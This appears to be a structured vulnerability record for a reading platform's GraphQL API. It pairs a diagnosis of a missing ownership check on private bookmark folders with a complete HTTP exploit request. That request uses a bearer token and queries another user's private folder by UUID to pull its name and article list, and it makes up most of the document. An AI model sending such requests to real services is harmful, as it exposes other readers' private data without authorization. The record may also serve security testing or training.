diagnosis: The reading platform GraphQL query resolver fetches bookmark folders by UUID without evaluating whether private folders belong to the authenticated user. Platform members can inspect private reading lists and unpublished article bookmarks belonging to other readers.
exploit_request:
POST /graphql HTTP/1.1
Host: reader.publishingportal.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJub3ZlbF9mYW4ifQ.token
Content-Type: application/json

{"query": "query { bookmarkFolder(folderId: \"3f1c8a00-1122-3344-5566-778899aabbcc\") { folderName isPrivate articles { id title url } } }"}
